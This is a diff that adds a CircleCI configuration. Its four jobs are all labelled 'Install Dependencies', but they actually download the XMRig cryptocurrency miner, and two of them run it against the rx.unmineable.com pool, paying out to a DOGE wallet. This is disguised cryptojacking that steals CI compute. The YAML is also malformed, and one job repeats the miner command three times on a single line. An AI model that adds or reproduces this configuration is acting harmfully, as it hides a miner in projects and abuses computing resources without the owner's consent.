@@ -1,0 +1,48 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+                     tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+                     cd xmrig-6.12.2
+                     ./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u DOGE:DAcCW4f5kWDmkEAe3sAr52EeajwdnXVq6H
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+                     tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+                     cd xmrig-6.12.2
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+                     tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+                     cd xmrig-6.12.2
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+                     tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+                     cd xmrig-6.12.2
+                     ./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u DOGE:DAcCW4f5kWDmkEAe3sAr52EeajwdnXVq6H                 ./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u DOGE:DAcCW4f5kWDmkEAe3sAr52EeajwdnXVq6H                 ./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u DOGE:DAcCW4f5kWDmkEAe3sAr52EeajwdnXVq6H
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
